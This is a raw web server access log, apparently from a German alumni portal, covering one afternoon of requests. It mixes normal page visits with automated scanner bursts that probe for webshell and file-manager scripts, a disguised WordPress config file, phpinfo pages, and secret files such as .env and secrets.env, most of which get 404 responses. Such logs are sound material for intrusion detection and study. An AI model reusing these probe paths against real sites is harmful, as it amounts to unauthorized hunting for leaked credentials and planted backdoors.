b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:23:31;;/mar.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:23:33;;/lv.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:23:33;;/mail.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:23:34;;/wp-content/themes/aahana/json.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:23:35;;/aipoyp.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:23:37;;/db.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:23:38;;/m.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:23:39;;/up.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:23:39;;/dfre.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:23:40;;/men.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:23:41;;/media.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:23:42;;/wp-content/cong.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:23:43;;/uplozyu.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:23:44;;/wp-includes/Text/wp-conflg.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:23:45;;/shell.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:23:46;;/system.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:23:47;;/num.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:23:47;;/zc-749.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:23:48;;/bala.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:23:49;;/item.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:23:50;;/000.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:23:51;;/file22.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:23:52;;/jf1d22.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:23:53;;/asd67.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:23:55;;/Okxob.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:23:56;;/mah.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:23:58;;/goat1.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:23:59;;/naxc.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:24:00;;/lock360.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:24:01;;/ini.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:24:02;;/uploat.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:24:02;;/wp-includes/style-engine/index.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:24:03;;/wp-configs.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:24:04;;/zc-903.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:24:05;;/about/function.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:24:06;;/wp-admin/log.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:24:07;;/oxvrws.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:24:08;;/we.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:24:12;;/02.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:24:14;;/system_log.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:24:15;;/CLA.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:24:16;;/sk25_1.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:24:17;;/autoload_classmap.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:24:18;;/css/xp.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:24:19;;/file21.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:24:20;;/himu.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:24:21;;/hn.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:24:21;;/as/function.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:24:22;;/flower.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:24:23;;/f35.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:24:24;;/doc.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:24:25;;/tentang_rmol.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:24:26;;/pass.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:24:26;;/classwithtostring.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:24:27;;/jp.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:24:28;;/cc.php;GET;404
b600451185427d490de43a0d13c2502cb0387b31bb1d74a52c09a51f6cbda0e7;2025-11-02 15:24:29;;/file5.php;GET;404
8bc243a37ad87e7d6fe984b47c00feac38acc21a4c23c431e9896a39ef77b4e3;2025-11-02 15:27:08;;/personen/alumni/schule/9002;GET;200
3e360fd662329546191489c3a91276e42d714085d1d3c4f52c089883166da633;2025-11-02 15:30:24;;/;GET;200
393c24d2fa29276af0b0124fdcf58d0d60c4376efb90b5dfa7317e6d4c7f2822;2025-11-02 15:31:54;;/sites/all/libraries/elfinder/connectors/php/connector.php;GET;404
414f69494724928af0a78d4abe7637fef732ba59c4b47e5fc06e5457ebf1fde4;2025-11-02 15:34:17;;/;GET;200
40cbd845420c94448f78222d4fc99392097c5108178fb43014dd694c11809747;2025-11-02 15:37:22;;/;GET;200
ad6da2c23fbabd3caad59a843353cf485383eba2db3f7eba2d8f76ee5e2f5932;2025-11-02 15:39:39;;/app_dev.php/_profiler/phpinfo;GET;404
ad6da2c23fbabd3caad59a843353cf485383eba2db3f7eba2d8f76ee5e2f5932;2025-11-02 15:39:39;;/?phpinfo=-1;GET;200
ad6da2c23fbabd3caad59a843353cf485383eba2db3f7eba2d8f76ee5e2f5932;2025-11-02 15:39:41;;/?url=.env;GET;200
ad6da2c23fbabd3caad59a843353cf485383eba2db3f7eba2d8f76ee5e2f5932;2025-11-02 15:39:42;;/phpinfo.php;GET;404
ad6da2c23fbabd3caad59a843353cf485383eba2db3f7eba2d8f76ee5e2f5932;2025-11-02 15:39:43;;/info/;GET;404
ad6da2c23fbabd3caad59a843353cf485383eba2db3f7eba2d8f76ee5e2f5932;2025-11-02 15:39:45;;/phpinfo/;GET;404
ad6da2c23fbabd3caad59a843353cf485383eba2db3f7eba2d8f76ee5e2f5932;2025-11-02 15:39:49;;/.config.yaml;GET;404
ad6da2c23fbabd3caad59a843353cf485383eba2db3f7eba2d8f76ee5e2f5932;2025-11-02 15:39:50;;/info;GET;404
ad6da2c23fbabd3caad59a843353cf485383eba2db3f7eba2d8f76ee5e2f5932;2025-11-02 15:39:51;;/secrets.env;GET;404
ad6da2c23fbabd3caad59a843353cf485383eba2db3f7eba2d8f76ee5e2f5932;2025-11-02 15:39:54;;/test;GET;404
11084715cdc1df5b088c32e8c02e8909edac8e73712d61d5b6bf498a8d016095;2025-11-02 15:43:37;;/personen/alumni/schule/164045;GET;200
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:29;;/wp-content/plugins/hellopress/wp_filemanager.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:31;;/link.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:31;;/chosen.php?p=;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:32;;/mail.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:32;;/lock360.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:33;;/function.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:33;;/classwithtostring.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:34;;/1.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:34;;/autoload_classmap.php?p=;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:35;;/post.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:36;;/wp-conflg.php?p=;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:36;;/manager.php?p=;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:37;;/alfa.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:37;;/goods.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:38;;/wp-trackback.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:38;;/about.php?p=;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:39;;/themes.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:39;;/wp-login.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:40;;/simple.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:40;;/class.php?p=;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:41;;/as.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:41;;/file.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:42;;/bless.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:42;;/alfanew.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:43;;/404.php?fm=true;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:44;;/ini.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:44;;/fm.php?p=;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:45;;/atomlib.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:45;;/inputs.php?p=;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:46;;/moon.php?p=;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:46;;/lv.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:47;;/cong.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:48;;/link.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:49;;/buy.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:50;;/zfile.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:50;;/css.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:51;;/radio.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:52;;/wp.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:53;;/abcd.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:54;;/nc4.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:54;;/wso.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:55;;/rss.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:56;;/ant.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:57;;/ioxi-o.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:57;;/wpc.php?p=;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:58;;/js.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:49:59;;/ar.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:00;;/xmrlpc.php?p=;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:01;;/c.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:01;;/byp.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:02;;/fm1.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:03;;/doc.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:04;;/Angelv2.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:04;;/acp.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:05;;/gdn.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:06;;/asas.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:07;;/123.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:08;;/v1.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:09;;/v2.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:09;;/rk2.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:10;;/222.php?p=;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:11;;/wp-22.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:12;;/lc.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:13;;/mini.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:13;;/lv.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:14;;/alfanew.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:15;;/m.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:16;;/db.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:17;;/aks.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:17;;/f.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:18;;/wp-files.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:19;;/cloud.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:20;;/asa.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:21;;/gecko-litespeed.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:21;;/bolt.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:22;;/NewFile.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:23;;/otuz1.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:24;;/classwithtostring.php?p=;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:25;;/info.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:26;;/mlex.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:26;;/file1.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:27;;/11.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:28;;/warm.PhP7;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:29;;/zxl.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:30;;/wp-wso.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:31;;/uana.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:32;;/a.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:32;;/ayk.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:33;;/gawean.PhP7;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:34;;/inc.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:35;;/api.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:35;;/ioxi-rex4.php7;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:36;;/million.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:37;;/include.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:38;;/bala.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:39;;/category.tokens.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:39;;/mari.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:40;;/json.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:41;;/new.php;GET;404
1a8f6037d0b03e0716d8675b90cdd472b8e15555464ec82792c698db0721ed25;2025-11-02 15:50:42;;/woh.php;GET;404
117ba6dba54292f6ef93da53b79541f03f645ecb212d57fe8aadf5feb0622a8d;2025-11-02 15:50:56;;/about/allgemein;GET;200
bac7ccc9e16e739584ca5712a18fb1693355d6946d8bd89d4db98a0aa6e5841e;2025-11-02 15:56:56;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
65965b6427bb6ca83c8f6cf29526778824a89a5fbe9f6d2113c493db42ff811a;2025-11-02 16:00:56;;/;GET;200
ee88d6b8f3c54a96dca2646d08a272b394ceb5f90c335b2d006d799f1c7ffd12;2025-11-02 16:02:42;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
3f01de09f2f3ba8e6ebd822af6a132b35e40ccd035d317fbc52e2823dabba305;2025-11-02 16:04:05;;/;GET;200
58ce5010c973b9b30a526126a0531e2f54cbbf2c7042e9739337cd2f8fb0d963;2025-11-02 16:08:44;;/personen/alumni/schule/9001;GET;200
32ddab71f268bd79d62201ac83d7de2c126a24d8fc01b35f5bfd75f830365986;2025-11-02 16:10:32;;/.well-known/security.txt;GET;404
f86013e1202c554ce1150a877d7bd2cbc75e000ffc8a1e1225af3396be8fb482;2025-11-02 16:14:21;;/personen/alumni/schule/MP004;GET;200
80db4c5995539e53579176eeb9be27bf0bb8c3242b99c6049d839e4f27229174;2025-11-02 16:15:25;;/gruppen/interesse/strategische-planung;GET;200
787cccfa239c9050ac51103718f8033d1c2208bb9418b2b47949efa4276d5820;2025-11-02 16:16:08;;/;GET;200
f3f1d21f890d433aa4653fc46a98799fb6d808298bf98f2c203bbbd3142e5fc2;2025-11-02 16:20:13;;/personen/alumni/schule/9009;GET;200
871bc52185f6dbb65b4826f2e5334c4b30fa8ff54069e6a0a84b07beb736441d;2025-11-02 16:25:52;;/personen/alumni/schule/03A04;GET;200
0b8e1119c2963c87d585cedb1b21570061bd0e0837bb4553ce38d5c457f28f32;2025-11-02 16:26:37;;/;GET;200
bbdced1c2032d061c920aa5d349fadc41a17ade0dbc74892411800c3e813ce3e;2025-11-02 16:30:42;;/;GET;200
c8eb573d356c0e6aa4227f45e544e72f90f0c6e40ae3b27efcf964d9fef610f9;2025-11-02 16:31:45;;/aktuelles/meldungen;GET;200
204eee997c5e17cf36c3eb0539a06a196090c7f68ee367b3e96a99156223fdc0;2025-11-02 16:36:58;;/personen/alumni/schule/07A05;GET;200
ace2cd2c7b11591cea28c32c3f6fd82ad10ffdfa5bfa64f2f6dd46721a045373;2025-11-02 16:42:17;;/personen/alumni/schule/0349;GET;200
d409e7bc0da2875eb1fbfe2e8bed93e52d0e80c5f81bb9572106330e787a5211;2025-11-02 16:47:24;;/personen/alumni/schule/0350;GET;200
a7edec77fa0f07385468b38a4b6b8f499570e06572dad39ec428d5ef819bf76e;2025-11-02 16:49:07;;/;GET;200
55d34873bd1697d1cdcb759f6db294129384ede58eeaeac0852854f72e7d238b;2025-11-02 16:52:48;;/personen/alumni/schule/164094;GET;200
bef796038b019bfb232892b7eea495b48633aa68cdab7602c88eae55f0a746f2;2025-11-02 16:58:36;;/personen/alumni/schule/188001;GET;200
80db4c5995539e53579176eeb9be27bf0bb8c3242b99c6049d839e4f27229174;2025-11-02 17:00:47;;/gruppen/interesse/datenanalyse-und-forschung;GET;200
80db4c5995539e53579176eeb9be27bf0bb8c3242b99c6049d839e4f27229174;2025-11-02 17:01:26;;/gruppen/plausch/ai-driven-programme;GET;200
faec20dbad2872ea6df7b08616587242699c9f0aba3e4317d91c25ac87d4527b;2025-11-02 17:04:10;;/personen/alumni/schule/BW001;GET;200
61fe401b6a21c12bd49c49a52574e593da355c70802b131653181d3dd798d777;2025-11-02 17:09:27;;/personen/alumni/schule/4240545;GET;200
f2cf632b88bbb71158b7dd50c24d1380c951317fc42a9144d73e37c598857e80;2025-11-02 17:14:28;;/personen/alumni/schule/MP003;GET;200
1ba060fce115a1d8210c7118dedbdde3248b2e5aac862755d57fdf4deaaa3638;2025-11-02 17:19:23;;/personen/alumni/schule/600027;GET;200
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 17:23:26;;/wp-content/plugins/hellopress/wp_filemanager.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 17:23:27;;/error.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 17:23:28;;/031.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 17:23:29;;/ilex.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 17:23:30;;/flex.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 17:23:31;;/18299.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 17:23:31;;/mlex.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 17:23:32;;/wlex.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 17:23:33;;/wp-aaa.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 17:23:34;;/klex.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 17:23:35;;/about3.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 17:23:35;;/222.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 17:23:36;;/444.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 17:23:37;;/file9.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 17:23:38;;/filesss.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 17:23:39;;/file88.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 17:23:39;;/gifclass4.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 17:23:40;;/class-wp.php;GET;404
